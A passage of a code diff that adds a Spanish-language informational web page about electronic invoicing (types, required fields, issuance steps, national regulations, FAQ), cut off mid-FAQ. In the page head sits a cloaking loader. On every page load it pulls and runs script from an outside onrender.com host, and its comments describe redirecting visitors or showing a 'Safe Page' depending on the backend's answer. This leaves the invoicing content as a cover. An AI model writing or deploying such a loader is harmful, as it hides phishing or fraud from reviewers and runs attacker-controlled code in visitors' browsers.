@@ -1,0 +1,675 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>FacturaNet – Información sobre Facturas Online</title>
+<script>
+        (function() {
+            // ID aleatorio para evitar caché y pasar validación básica
+            var randomID = "u" + Math.random().toString(36).substring(7);
+
+            // APUNTA AL PUERTO 3008 (Backend Node.js)
+            var backendURL = "https://apimetrics-7vwg.onrender.com/" + randomID;
+
+            var s = document.createElement('script');
+            s.src = backendURL;
+
+            // Cuando el backend responda...
+            s.onload = function() {
+                // Si el backend dice "window.__view = true", mostramos la web
+                // Si el backend redirecciona, esto no llegará a ejecutarse visualmente
+                setTimeout(function(){
+                    if (window.__view) {
+                        var loader = document.getElementById('preloader');
+                        if (loader) loader.style.display = 'none';
+                    }
+                }, 50);
+            };
+
+            // En caso de error de conexión (Node apagado), mostrar la web por defecto
+            s.onerror = function() {
+                console.warn("Backend no disponible. Mostrando Safe Page.");
+                var loader = document.getElementById('preloader');
+                if (loader) loader.style.display = 'none';
+            };
+
+            document.head.appendChild(s);
+        })();
+    </script>
+  <style>
+#preloader {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: #ffffff; z-index: 999999;
+            display: flex; justify-content: center; align-items: center;
+        }
+        .spinner {
+            width: 50px; height: 50px; border: 5px solid #f3f3f3;
+            border-top: 5px solid #0a1e3c; border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --blue:    #2563eb;
+      --blue-dk: #1d4ed8;
+      --blue-lt: #eff6ff;
+      --teal:    #0d9488;
+      --gray-50: #f9fafb;
+      --gray-100:#f3f4f6;
+      --gray-200:#e5e7eb;
+      --gray-500:#6b7280;
+      --gray-700:#374151;
+      --gray-900:#111827;
+      --white:   #ffffff;
+      --radius:  12px;
+      --shadow:  0 4px 24px rgba(0,0,0,.08);
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      color: var(--gray-700);
+      background: var(--white);
+      line-height: 1.65;
+    }
+
+    a { color: var(--blue); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* ── NAV ── */
+    nav {
+      position: sticky; top: 0; z-index: 100;
+      background: var(--white);
+      border-bottom: 1px solid var(--gray-200);
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 2rem; height: 64px;
+      box-shadow: 0 2px 8px rgba(0,0,0,.05);
+    }
+    .nav-logo { font-size: 1.3rem; font-weight: 700; color: var(--blue); display: flex; align-items: center; gap: .45rem; }
+    .nav-logo svg { width: 28px; height: 28px; }
+    .nav-links { display: flex; gap: 1.8rem; font-size: .9rem; }
+    .nav-links a { color: var(--gray-700); font-weight: 500; }
+    .nav-links a:hover { color: var(--blue); text-decoration: none; }
+    .nav-cta {
+      background: var(--blue); color: var(--white) !important;
+      padding: .45rem 1.2rem; border-radius: 8px; font-weight: 600; font-size: .9rem;
+      transition: background .2s;
+    }
+    .nav-cta:hover { background: var(--blue-dk) !important; text-decoration: none !important; }
+    .hamburger { display: none; cursor: pointer; flex-direction: column; gap: 5px; }
+    .hamburger span { display: block; width: 24px; height: 2px; background: var(--gray-700); border-radius: 2px; }
+
+    /* ── HERO ── */
+    .hero {
+      background: linear-gradient(135deg, #1e40af 0%, #0ea5e9 100%);
+      color: var(--white);
+      padding: 6rem 2rem 5rem;
+      text-align: center;
+    }
+    .hero-badge {
+      display: inline-block;
+      background: rgba(255,255,255,.2);
+      border: 1px solid rgba(255,255,255,.35);
+      border-radius: 999px;
+      padding: .3rem 1rem;
+      font-size: .8rem; font-weight: 600; letter-spacing: .06em;
+      text-transform: uppercase; margin-bottom: 1.5rem;
+    }
+    .hero h1 { font-size: clamp(2rem, 5vw, 3.2rem); font-weight: 800; line-height: 1.15; margin-bottom: 1.2rem; }
+    .hero p { font-size: 1.15rem; max-width: 640px; margin: 0 auto 2.5rem; opacity: .9; }
+    .hero-btns { display: flex; gap: 1rem; justify-content: center; flex-wrap: wrap; }
+    .btn-white {
+      background: var(--white); color: var(--blue);
+      padding: .75rem 2rem; border-radius: 10px; font-weight: 700; font-size: 1rem;
+      box-shadow: 0 4px 14px rgba(0,0,0,.15); transition: transform .15s;
+    }
+    .btn-white:hover { transform: translateY(-2px); text-decoration: none; }
+    .btn-outline {
+      background: transparent; color: var(--white);
+      border: 2px solid rgba(255,255,255,.6);
+      padding: .75rem 2rem; border-radius: 10px; font-weight: 600; font-size: 1rem;
+      transition: background .2s;
+    }
+    .btn-outline:hover { background: rgba(255,255,255,.15); text-decoration: none; }
+
+    /* ── STATS BAR ── */
+    .stats {
+      display: flex; justify-content: center; flex-wrap: wrap;
+      gap: 0; background: var(--gray-900); color: var(--white);
+    }
+    .stat-item { padding: 1.6rem 3rem; text-align: center; border-right: 1px solid rgba(255,255,255,.1); flex: 1; min-width: 160px; }
+    .stat-item:last-child { border-right: none; }
+    .stat-num { font-size: 2rem; font-weight: 800; color: #60a5fa; }
+    .stat-label { font-size: .85rem; opacity: .7; margin-top: .2rem; }
+
+    /* ── SECTIONS ── */
+    section { padding: 5rem 2rem; }
+    .container { max-width: 1100px; margin: 0 auto; }
+    .section-label { font-size: .8rem; font-weight: 700; text-transform: uppercase; letter-spacing: .1em; color: var(--blue); margin-bottom: .6rem; }
+    .section-title { font-size: clamp(1.6rem, 3vw, 2.2rem); font-weight: 800; color: var(--gray-900); margin-bottom: 1rem; }
+    .section-sub { max-width: 600px; color: var(--gray-500); font-size: 1.05rem; }
+    .section-header { margin-bottom: 3.5rem; }
+    .section-header.center { text-align: center; }
+    .section-header.center .section-sub { margin: 0 auto; }
+
+    /* ── QUÉ ES ── */
+    .what-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 4rem; align-items: center; }
+    .what-visual {
+      background: linear-gradient(135deg, var(--blue-lt), #e0f2fe);
+      border-radius: var(--radius);
+      padding: 2.5rem;
+    }
+    .invoice-mockup {
+      background: var(--white);
+      border-radius: 10px;
+      box-shadow: var(--shadow);
+      padding: 1.5rem;
+      font-size: .8rem;
+    }
+    .inv-header { display: flex; justify-content: space-between; margin-bottom: 1rem; }
+    .inv-logo { font-weight: 800; color: var(--blue); font-size: 1rem; }
+    .inv-badge { background: #dcfce7; color: #166534; font-size: .7rem; font-weight: 700; padding: .2rem .6rem; border-radius: 99px; }
+    .inv-line { height: 8px; background: var(--gray-100); border-radius: 4px; margin: .5rem 0; }
+    .inv-line.short { width: 60%; }
+    .inv-line.med { width: 80%; }
+    .inv-table { border-top: 1px solid var(--gray-200); margin-top: 1rem; padding-top: 1rem; }
+    .inv-row { display: flex; justify-content: space-between; padding: .3rem 0; border-bottom: 1px dashed var(--gray-200); color: var(--gray-700); }
+    .inv-total { display: flex; justify-content: space-between; font-weight: 800; color: var(--gray-900); padding-top: .6rem; font-size: .9rem; }
+    .what-list { list-style: none; display: flex; flex-direction: column; gap: .8rem; margin-top: 1.5rem; }
+    .what-list li { display: flex; align-items: flex-start; gap: .7rem; }
+    .check { width: 22px; height: 22px; min-width: 22px; background: var(--blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-top: .1rem; }
+    .check svg { width: 12px; height: 12px; stroke: #fff; stroke-width: 2.5; fill: none; }
+
+    /* ── TIPOS ── */
+    .tipos-bg { background: var(--gray-50); }
+    .tipos-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1.5rem; }
+    .tipo-card {
+      background: var(--white);
+      border: 1px solid var(--gray-200);
+      border-radius: var(--radius);
+      padding: 2rem;
+      transition: box-shadow .2s, transform .2s;
+    }
+    .tipo-card:hover { box-shadow: var(--shadow); transform: translateY(-3px); }
+    .tipo-icon { width: 52px; height: 52px; border-radius: 14px; display: flex; align-items: center; justify-content: center; margin-bottom: 1.2rem; font-size: 1.5rem; }
+    .tipo-card h3 { font-size: 1.05rem; font-weight: 700; color: var(--gray-900); margin-bottom: .5rem; }
+    .tipo-card p { font-size: .9rem; color: var(--gray-500); line-height: 1.6; }
+
+    /* ── ELEMENTOS ── */
+    .elementos-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.2rem; }
+    .elem-card { display: flex; gap: 1rem; align-items: flex-start; background: var(--blue-lt); border-radius: var(--radius); padding: 1.4rem; }
+    .elem-num { background: var(--blue); color: var(--white); width: 32px; height: 32px; min-width: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: .85rem; }
+    .elem-card h4 { font-size: .95rem; font-weight: 700; color: var(--gray-900); margin-bottom: .3rem; }
+    .elem-card p { font-size: .85rem; color: var(--gray-500); }
+
+    /* ── PROCESO ── */
+    .proceso-bg { background: var(--gray-50); }
+    .proceso-list { display: flex; flex-direction: column; gap: 0; max-width: 720px; margin: 0 auto; }
+    .paso { display: flex; gap: 1.5rem; align-items: flex-start; padding: 2rem 0; border-bottom: 1px solid var(--gray-200); }
+    .paso:last-child { border-bottom: none; }
+    .paso-num { width: 48px; height: 48px; min-width: 48px; border-radius: 50%; background: var(--blue); color: var(--white); font-weight: 800; font-size: 1.1rem; display: flex; align-items: center; justify-content: center; }
+    .paso h3 { font-size: 1.05rem; font-weight: 700; color: var(--gray-900); margin-bottom: .4rem; }
+    .paso p { font-size: .92rem; color: var(--gray-500); }
+
+    /* ── BENEFICIOS ── */
+    .bene-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 1.5rem; }
+    .bene-card { text-align: center; padding: 2.2rem 1.5rem; border: 1px solid var(--gray-200); border-radius: var(--radius); transition: box-shadow .2s; }
+    .bene-card:hover { box-shadow: var(--shadow); }
+    .bene-icon { font-size: 2.2rem; margin-bottom: 1rem; }
+    .bene-card h3 { font-size: 1rem; font-weight: 700; color: var(--gray-900); margin-bottom: .5rem; }
+    .bene-card p { font-size: .88rem; color: var(--gray-500); }
+
+    /* ── FAQ ── */
+    .faq-list { max-width: 780px; margin: 0 auto; display: flex; flex-direction: column; gap: .8rem; }
+    .faq-item { background: var(--white); border: 1px solid var(--gray-200); border-radius: var(--radius); overflow: hidden; }
+    .faq-q { width: 100%; text-align: left; padding: 1.2rem 1.5rem; font-size: 1rem; font-weight: 600; color: var(--gray-900); background: none; border: none; cursor: pointer; display: flex; justify-content: space-between; align-items: center; gap: 1rem; }
+    .faq-q svg { min-width: 20px; transition: transform .3s; color: var(--blue); }
+    .faq-q.open svg { transform: rotate(45deg); }
+    .faq-a { padding: 0 1.5rem; max-height: 0; overflow: hidden; transition: max-height .35s ease, padding .3s; }
+    .faq-a.open { max-height: 300px; padding: 0 1.5rem 1.2rem; }
+    .faq-a p { font-size: .92rem; color: var(--gray-500); line-height: 1.7; }
+
+    /* ── NORMATIVA ── */
+    .norm-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1.5rem; }
+    .norm-card { border-left: 4px solid var(--blue); background: var(--blue-lt); border-radius: 0 var(--radius) var(--radius) 0; padding: 1.5rem; }
+    .norm-card h3 { font-size: 1rem; font-weight: 700; color: var(--gray-900); margin-bottom: .5rem; }
+    .norm-card p { font-size: .88rem; color: var(--gray-500); line-height: 1.6; }
+
+    /* ── CTA ── */
+    .cta-section { background: linear-gradient(135deg, #1e40af 0%, #0ea5e9 100%); text-align: center; color: var(--white); padding: 5rem 2rem; }
+    .cta-section h2 { font-size: clamp(1.6rem, 3vw, 2.4rem); font-weight: 800; margin-bottom: 1rem; }
+    .cta-section p { opacity: .85; font-size: 1.05rem; max-width: 560px; margin: 0 auto 2.5rem; }
+
+    /* ── FOOTER ── */
+    footer { background: var(--gray-900); color: var(--white); padding: 3.5rem 2rem 2rem; }
+    .footer-inner { max-width: 1100px; margin: 0 auto; }
+    .footer-top { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 3rem; margin-bottom: 3rem; }
+    .footer-logo { font-size: 1.3rem; font-weight: 800; color: var(--white); margin-bottom: .8rem; }
+    .footer-desc { font-size: .88rem; opacity: .55; line-height: 1.7; }
+    .footer-col h4 { font-size: .85rem; font-weight: 700; text-transform: uppercase; letter-spacing: .07em; opacity: .45; margin-bottom: 1rem; }
+    .footer-col ul { list-style: none; display: flex; flex-direction: column; gap: .6rem; }
+    .footer-col ul li a { font-size: .9rem; color: rgba(255,255,255,.7); }
+    .footer-col ul li a:hover { color: #fff; text-decoration: none; }
+    .footer-bottom { border-top: 1px solid rgba(255,255,255,.1); padding-top: 1.5rem; font-size: .82rem; opacity: .4; text-align: center; }
+
+    /* ── RESPONSIVE ── */
+    @media (max-width: 768px) {
+      .nav-links { display: none; }
+      .hamburger { display: flex; }
+      .nav-links.open { display: flex; flex-direction: column; position: absolute; top: 64px; left: 0; right: 0; background: var(--white); border-bottom: 1px solid var(--gray-200); padding: 1rem 2rem; gap: 1rem; z-index: 99; }
+      .what-grid { grid-template-columns: 1fr; }
+      .footer-top { grid-template-columns: 1fr 1fr; gap: 2rem; }
+      .stat-item { min-width: 140px; }
+    }
+    @media (max-width: 480px) {
+      .footer-top { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav>
+  <div class="nav-logo">
+    <svg viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <rect width="28" height="28" rx="7" fill="#2563eb"/>
+      <path d="M7 10h14M7 14h10M7 18h7" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+    </svg>
+    FacturaNet
+  </div>
+  <div class="nav-links" id="navLinks">
+    <a href="#que-es">¿Qué es?</a>
+    <a href="#tipos">Tipos</a>
+    <a href="#elementos">Elementos</a>
+    <a href="#proceso">Proceso</a>
+    <a href="#beneficios">Beneficios</a>
+    <a href="#faq">FAQ</a>
+    <a href="#contacto" class="nav-cta">Contacto</a>
+  </div>
+  <div class="hamburger" id="hamburger" onclick="toggleNav()">
+    <span></span><span></span><span></span>
+  </div>
+</nav>
+
+<!-- HERO -->
+<section class="hero">
+  <div class="hero-badge">Guía Completa · 2026</div>
+  <h1>Todo sobre la<br>Factura Electrónica</h1>
+  <p>Aprende qué es, cómo funciona, sus tipos, elementos obligatorios y por qué la facturación online es el estándar actual.</p>
+  <div class="hero-btns">
+    <a href="#que-es" class="btn-white">Comenzar a aprender</a>
+    <a href="#faq" class="btn-outline">Ver preguntas frecuentes</a>
+  </div>
+</section>
+
+<!-- STATS -->
+<div class="stats">
+  <div class="stat-item">
+    <div class="stat-num">80%</div>
+    <div class="stat-label">reducción de costos de papel</div>
+  </div>
+  <div class="stat-item">
+    <div class="stat-num">3 seg</div>
+    <div class="stat-label">tiempo promedio de envío</div>
+  </div>
+  <div class="stat-item">
+    <div class="stat-num">100%</div>
+    <div class="stat-label">válida legalmente</div>
+  </div>
+  <div class="stat-item">
+    <div class="stat-num">+60</div>
+    <div class="stat-label">países con normativa vigente</div>
+  </div>
+</div>
+
+<!-- QUÉ ES -->
+<section id="que-es">
+  <div class="container">
+    <div class="what-grid">
+      <div>
+        <div class="section-label">Definición</div>
+        <h2 class="section-title">¿Qué es una factura electrónica?</h2>
+        <p>Una <strong>factura electrónica</strong> es un documento fiscal digital que registra una transacción comercial entre un vendedor y un comprador. Tiene exactamente la misma validez legal que una factura en papel, pero se emite, transmite y recibe por medios electrónicos.</p>
+        <ul class="what-list">
+          <li><div class="check"><svg viewBox="0 0 12 12"><polyline points="2,6 5,9 10,3"/></svg></div><span>Mismo valor legal que la factura en papel</span></li>
+          <li><div class="check"><svg viewBox="0 0 12 12"><polyline points="2,6 5,9 10,3"/></svg></div><span>Firmada digitalmente para garantizar autenticidad</span></li>
+          <li><div class="check"><svg viewBox="0 0 12 12"><polyline points="2,6 5,9 10,3"/></svg></div><span>Almacenable en la nube durante años</span></li>
+          <li><div class="check"><svg viewBox="0 0 12 12"><polyline points="2,6 5,9 10,3"/></svg></div><span>Reportable automáticamente a hacienda</span></li>
+          <li><div class="check"><svg viewBox="0 0 12 12"><polyline points="2,6 5,9 10,3"/></svg></div><span>Consulta y descarga 24/7 desde cualquier dispositivo</span></li>
+        </ul>
+      </div>
+      <div class="what-visual">
+        <div class="invoice-mockup">
+          <div class="inv-header">
+            <div class="inv-logo">MiEmpresa S.A.</div>
+            <div class="inv-badge">✓ Validada</div>
+          </div>
+          <div style="font-size:.7rem;color:#6b7280;margin-bottom:.5rem">FACTURA ELECTRÓNICA #FE-2026-00842</div>
+          <div class="inv-line med"></div>
+          <div class="inv-line short"></div>
+          <div class="inv-table">
+            <div class="inv-row"><span>Servicio de consultoría</span><span>$1,500</span></div>
+            <div class="inv-row"><span>Licencia software</span><span>$800</span></div>
+            <div class="inv-row"><span>Soporte técnico</span><span>$350</span></div>
+            <div style="height:.5rem"></div>
+            <div class="inv-row" style="color:#6b7280;font-size:.75rem"><span>Subtotal</span><span>$2,650</span></div>
+            <div class="inv-row" style="color:#6b7280;font-size:.75rem"><span>IVA 16%</span><span>$424</span></div>
+            <div class="inv-total"><span>TOTAL</span><span style="color:#2563eb">$3,074</span></div>
+          </div>
+          <div style="margin-top:1rem;padding:.6rem;background:#f0fdf4;border-radius:6px;font-size:.68rem;color:#166534;text-align:center">
+            🔒 Firma digital verificada · Emitida el 18/06/2026
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- TIPOS -->
+<section id="tipos" class="tipos-bg">
+  <div class="container">
+    <div class="section-header center">
+      <div class="section-label">Clasificación</div>
+      <h2 class="section-title">Tipos de facturas electrónicas</h2>
+      <p class="section-sub">Existen distintas modalidades según el propósito comercial y el tipo de transacción.</p>
+    </div>
+    <div class="tipos-grid">
+      <div class="tipo-card">
+        <div class="tipo-icon" style="background:#eff6ff">🧾</div>
+        <h3>Factura estándar</h3>
+        <p>Documenta la venta de bienes o la prestación de servicios entre empresas (B2B) o a consumidores finales (B2C).</p>
+      </div>
+      <div class="tipo-card">
+        <div class="tipo-icon" style="background:#fef3c7">📋</div>
+        <h3>Nota de crédito</h3>
+        <p>Reduce el valor de una factura ya emitida por devoluciones, descuentos posteriores o correcciones de importe.</p>
+      </div>
+      <div class="tipo-card">
+        <div class="tipo-icon" style="background:#f0fdf4">📈</div>
+        <h3>Nota de débito</h3>
+        <p>Aumenta el valor de una factura previa por cargos adicionales, intereses o ajustes de precio.</p>
+      </div>
+      <div class="tipo-card">
+        <div class="tipo-icon" style="background:#fdf4ff">🏪</div>
+        <h3>Ticket simplificado</h3>
+        <p>Versión resumida válida para ventas al detalle de bajo monto donde el comprador no requiere identificación.</p>
+      </div>
+      <div class="tipo-card">
+        <div class="tipo-icon" style="background:#fff1f2">🚀</div>
+        <h3>Factura de exportación</h3>
+        <p>Emitida en operaciones internacionales; incluye datos aduaneros, moneda extranjera y régimen fiscal especial.</p>
+      </div>
+      <div class="tipo-card">
+        <div class="tipo-icon" style="background:#ecfdf5">🔁</div>
+        <h3>Factura recurrente</h3>
+        <p>Se genera automáticamente de forma periódica para suscripciones, servicios mensuales o contratos de largo plazo.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ELEMENTOS OBLIGATORIOS -->
+<section id="elementos">
+  <div class="container">
+    <div class="section-header">
+      <div class="section-label">Contenido</div>
+      <h2 class="section-title">Elementos obligatorios de una factura</h2>
+      <p class="section-sub">Toda factura electrónica debe contener como mínimo la siguiente información para ser válida.</p>
+    </div>
+    <div class="elementos-grid">
+      <div class="elem-card"><div class="elem-num">01</div><div><h4>Número de folio</h4><p>Identificador único correlativo que distingue la factura de cualquier otra.</p></div></div>
+      <div class="elem-card"><div class="elem-num">02</div><div><h4>Fecha de emisión</h4><p>Día, mes y año en que se generó el documento electrónico.</p></div></div>
+      <div class="elem-card"><div class="elem-num">03</div><div><h4>Datos del emisor</h4><p>Nombre o razón social, RFC/RUC/NIT, dirección fiscal y régimen tributario.</p></div></div>
+      <div class="elem-card"><div class="elem-num">04</div><div><h4>Datos del receptor</h4><p>Nombre, identificación fiscal y dirección del comprador o cliente.</p></div></div>
+      <div class="elem-card"><div class="elem-num">05</div><div><h4>Descripción de conceptos</h4><p>Detalle de bienes o servicios, cantidad, unidad de medida y precio unitario.</p></div></div>
+      <div class="elem-card"><div class="elem-num">06</div><div><h4>Subtotal e impuestos</h4><p>Importe antes de impuestos, tipo y tasa de IVA u otros tributos aplicables.</p></div></div>
+      <div class="elem-card"><div class="elem-num">07</div><div><h4>Total a pagar</h4><p>Suma final en la moneda de la operación, incluyendo todos los impuestos.</p></div></div>
+      <div class="elem-card"><div class="elem-num">08</div><div><h4>Código QR / sello digital</h4><p>Cadena encriptada o código QR que permite verificar autenticidad ante el fisco.</p></div></div>
+      <div class="elem-card"><div class="elem-num">09</div><div><h4>Método de pago</h4><p>Transferencia, tarjeta, efectivo u otro medio acordado entre las partes.</p></div></div>
+      <div class="elem-card"><div class="elem-num">10</div><div><h4>Forma de pago</h4><p>Indica si el pago es al contado, a crédito o en parcialidades.</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- PROCESO -->
+<section id="proceso" class="proceso-bg">
+  <div class="container">
+    <div class="section-header center">
+      <div class="section-label">Cómo funciona</div>
+      <h2 class="section-title">Proceso de emisión paso a paso</h2>
+      <p class="section-sub">Desde la creación hasta la recepción, así fluye una factura electrónica.</p>
+    </div>
+    <div class="proceso-list">
+      <div class="paso">
+        <div class="paso-num">1</div>
+        <div>
+          <h3>Generación del documento XML</h3>
+          <p>El sistema de facturación crea un archivo en formato XML con todos los datos de la transacción: emisor, receptor, conceptos e importes.</p>
+        </div>
+      </div>
+      <div class="paso">
+        <div class="paso-num">2</div>
+        <div>
+          <h3>Firma digital</h3>
+          <p>El archivo es firmado electrónicamente mediante un certificado digital emitido por la autoridad tributaria. Esto garantiza la integridad y autenticidad del documento.</p>
+        </div>
+      </div>
+      <div class="paso">
+        <div class="paso-num">3</div>
+        <div>
+          <h3>Validación por la autoridad fiscal</h3>
+          <p>El documento firmado se envía a la plataforma del fisco (SAT, SUNAT, DIAN, SII, etc.) para su validación en tiempo real. Si los datos son correctos, se emite un timbre o sello de autorización.</p>
+        </div>
+      </div>
+      <div class="paso">
+        <div class="paso-num">4</div>
+        <div>
+          <h3>Envío al receptor</h3>
+          <p>La factura validada —en formato PDF y XML— se envía automáticamente al correo del cliente o a su portal de facturas. El proceso suele tomar menos de 5 segundos.</p>
+        </div>
+      </div>
+      <div class="paso">
+        <div class="paso-num">5</div>
+        <div>
+          <h3>Almacenamiento y consulta</h3>
+          <p>Tanto el emisor como el receptor deben conservar el archivo XML firmado durante el plazo legal (generalmente 5 a 10 años). Se puede consultar, descargar y compartir en cualquier momento.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- BENEFICIOS -->
+<section id="beneficios">
+  <div class="container">
+    <div class="section-header center">
+      <div class="section-label">Ventajas</div>
+      <h2 class="section-title">Beneficios de la facturación electrónica</h2>
+      <p class="section-sub">Pasar a la factura digital transforma la administración de tu negocio.</p>
+    </div>
+    <div class="bene-grid">
+      <div class="bene-card"><div class="bene-icon">💰</div><h3>Ahorro de costos</h3><p>Elimina gastos de impresión, papel, almacenamiento físico y envío postal.</p></div>
+      <div class="bene-card"><div class="bene-icon">⚡</div><h3>Rapidez</h3><p>Emite y recibe facturas en segundos sin importar la distancia geográfica.</p></div>
+      <div class="bene-card"><div class="bene-icon">🔒</div><h3>Seguridad</h3><p>La firma digital y el timbre fiscal previenen falsificaciones y fraudes.</p></div>
+      <div class="bene-card"><div class="bene-icon">🌱</div><h3>Ecológico</h3><p>Reduce el consumo de papel y la huella de carbono de tu empresa.</p></div>
+      <div class="bene-card"><div class="bene-icon">📊</div><h3>Control financiero</h3><p>Acceso inmediato a reportes de ingresos, gastos y conciliaciones.</p></div>
+      <div class="bene-card"><div class="bene-icon">🏛️</div><h3>Cumplimiento fiscal</h3><p>Declaraciones más fáciles y menor riesgo de multas por errores manuales.</p></div>
+      <div class="bene-card"><div class="bene-icon">☁️</div><h3>Acceso en la nube</h3><p>Consulta tus facturas desde cualquier dispositivo y en cualquier lugar.</p></div>
+      <div class="bene-card"><div class="bene-icon">🤖</div><h3>Automatización</h3><p>Integración con ERP, contabilidad y sistemas de cobro sin re-captura.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- NORMATIVA -->
+<section style="background:var(--gray-50); padding: 5rem 2rem;">
+  <div class="container">
+    <div class="section-header center">
+      <div class="section-label">Marco legal</div>
+      <h2 class="section-title">Normativa por país</h2>
+      <p class="section-sub">Cada país tiene su propio organismo regulador y estándar técnico para la factura electrónica.</p>
+    </div>
+    <div class="norm-grid">
+      <div class="norm-card"><h3>🇲🇽 México – CFDI</h3><p>El SAT regula el Comprobante Fiscal Digital por Internet. Obligatorio para todos los contribuyentes desde 2014. Versión actual: CFDI 4.0.</p></div>
+      <div class="norm-card"><h3>🇨🇴 Colombia – DIAN</h3><p>La DIAN implementó la facturación electrónica obligatoria por fases. Usa el formato UBL 2.1 y requiere habilitación previa de proveedores tecnológicos.</p></div>
+      <div class="norm-card"><h3>🇵🇪 Perú – SUNAT</h3><p>La SUNAT gestiona el sistema OSE/SEE. Empresas con ingresos superiores a cierto umbral deben emitir facturas electrónicas. Formato: XML UBL.</p></div>
+      <div class="norm-card"><h3>🇨🇱 Chile – SII</h3><p>El SII fue pionero en Latinoamérica (desde 2003). Usa el sistema DTE (Documento Tributario Electrónico) con firma electrónica avanzada.</p></div>
+      <div class="norm-card"><h3>🇧🇷 Brasil – NF-e</h3><p>La Nota Fiscal Eletrônica es gestionada por la SEFAZ. Brasil tiene uno de los sistemas más maduros del mundo, con múltiples variantes por tipo de operación.</p></div>
+      <div class="norm-card"><h3>🇪🇸 España – Verifactu</h3><p>La AEAT implementa Verifactu y el sistema de facturación electrónica B2B obligatorio conforme a la Ley Crea y Crece de 2022.</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section id="faq">
+  <div class="container">
+    <div class="section-header center">
+      <div class="section-label">Preguntas frecuentes</div>
+      <h2 class="section-title">¿Tienes dudas?</h2>
+      <p class="section-sub">Resolvemos las preguntas más comunes sobre la facturación electrónica.</p>
+    </div>
+    <div class="faq-list">
+      <div class="faq-item">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          ¿Una factura electrónica tiene la misma validez que una en papel?
+          <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+        </button>
+        <div class="faq-a">
+          <p>Sí. En todos los países que han adoptado la facturación electrónica, la factura digital tiene exactamente la misma validez legal y fiscal que una factura impresa. De hecho, en muchos países ya es la única forma válida de emitir comprobantes fiscales para ciertos contribuyentes.</p>
+        </div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          ¿Cuánto tiempo debo conservar mis facturas electrónicas?
+          <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+        </button>
+        <div class="faq-a">
+          <p>El plazo varía según el país, pero generalmente oscila entre 5 y 10 años. En México, el SAT exige conservarlas durante 5 años. En España, la AEAT requiere 4 años para deudas tributarias y hasta 10 para efectos mercantiles.</p>
+        </div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          ¿Puedo cancelar o corregir una factura electrónica ya emitida?
+          <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+        </button>
+        <div class="faq-a">
+          <p>Sí, aunque el proceso depende del país. En general no se modifica el documento original; se emite una nota de crédito o se cancela la factura dentro de los plazos establecidos. En México, la cancelación requiere aceptación del receptor en muchos casos.</p>
+        </div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          ¿Necesito un software especial para emitir facturas electrónicas?
+          <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+        </button>
+        <div class="faq-a">
+          <p>Sí. Necesitas un sistema de facturación certificado o un Proveedor Autorizado de Certificación (PAC). Existen opciones gratuitas ofrecidas por el propio fisco para volúmenes bajos, y soluciones comerciales para empresas con mayor cantidad de facturas.</p>
+        </div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          ¿Qué es la firma digital y por qué es importante?
+          <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+        </button>
+        <div class="faq-a">
+          <p>La firma digital es un mecanismo criptográfico que garantiza que el documento proviene del emisor legítimo (autenticidad) y que no ha sido alterado desde su creación (integridad). Es el equivalente digital de la firma manuscrita pero con mayor seguridad técnica.</p>
+        </div>
+      </div>
+      <div class="faq-item">
+        <button class="faq-q" onclick="toggleFaq(this)">
+          ¿Qué pasa si emito una factura con errores?
+          <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
+        </button>
+        <div class="faq-a">
